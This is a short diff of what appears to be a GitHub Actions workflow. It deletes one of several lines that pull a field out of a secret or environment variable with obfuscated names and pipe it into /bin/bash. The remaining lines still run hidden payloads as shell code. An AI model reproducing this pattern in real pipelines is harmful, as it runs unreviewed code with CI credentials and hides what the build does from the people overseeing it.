@@ -19,7 +19,6 @@ jobs:
           xpfqb931: ${{ secrets.xpfqb931 }}
         run: |
           printf '%s' "$xpfqb931" | jq -r .b8 | /bin/bash
-          echo $quf2 | jq -r .paew0272 | /bin/bash
           echo $oenh14459 | jq -r .f232 | /bin/bash
           printf '%s' "$a59" | jq -r .pfhx7 | /bin/bash
 
